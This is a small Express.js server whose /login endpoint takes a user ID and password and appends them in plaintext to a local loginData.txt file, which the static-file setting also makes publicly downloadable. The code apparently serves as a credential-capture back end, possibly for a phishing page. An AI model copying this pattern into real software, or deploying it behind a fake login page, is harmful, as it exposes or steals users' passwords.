const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

// Endpoint to handle login data
app.post('/login', (req, res) => {
    const { userID, password } = req.body;
    const data = `UserID: ${userID}, Password: ${password}\n`;

    // Save login data to a local file
    fs.appendFile(path.join(__dirname, 'loginData.txt'), data, (err) => {
        if (err) {
            console.error('Error saving data:', err);
            res.status(500).send('Error saving data');
        } else {
            res.send('Login data saved!');
        }
    });
});

// Start server
const PORT = 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
